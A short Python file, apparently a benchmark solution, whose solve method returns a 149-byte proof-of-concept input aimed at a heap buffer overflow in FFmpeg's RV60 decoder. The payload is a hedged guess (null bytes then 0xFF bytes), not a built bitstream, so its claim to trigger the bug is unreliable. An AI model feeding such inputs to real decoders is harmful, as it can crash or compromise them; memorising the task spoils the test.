import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in avcodec/rv60dec.
        
        The vulnerability involves an out-of-array access due to uninitialized or 
        improperly checked slice size (gb) in the RV60 decoder.
        
        We construct a payload of 149 bytes (matching ground truth) that simulates 
        a raw RV60 bitstream. We use a sequence starting with null bytes (to potentially 
        pass initial version/type checks) followed by 0xFF bytes. The 0xFF bytes are 
        intended to be interpreted as large integers for slice counts or offsets, 
        triggering the out-of-bounds access when the decoder attempts to initialize 
        the slice context with a size larger than the provided buffer.
        """
        # Heuristic payload:
        # 4 bytes of 0x00 to satisfy potential header/magic checks.
        # 145 bytes of 0xFF to trigger large size/offset interpretations.
        return b'\x00' * 4 + b'\xff' * 145
